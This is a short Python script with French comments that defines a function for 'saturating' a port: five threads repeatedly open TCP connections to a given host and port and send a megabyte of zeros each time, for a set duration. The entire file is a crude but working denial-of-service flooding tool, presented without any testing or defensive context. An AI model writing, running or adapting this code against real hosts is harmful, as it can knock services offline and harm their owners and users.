import time
import socket # on importe la bibliothèque qui permet de créer des interfaces réseau virtuelles
import threading
import requests

def sat(duree, port, host):
    """Fonction pour saturer un port

    Args:
        duree (integer): Durée en secondes de l'exécution
        port (integer): port à saturer
        host (string): hôte à saturer
    """
    
    threads = 5
    timer = time.time() + duree

    def send_data():
        while time.time() < timer:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, port))
                s.send(b'0' * 1024 * 1024)
                s.close()
            except Exception as e:
                print(f'Error:{e}')
    
    for i in range(threads):
        t = threading.Thread(target=send_data)
        t.start()
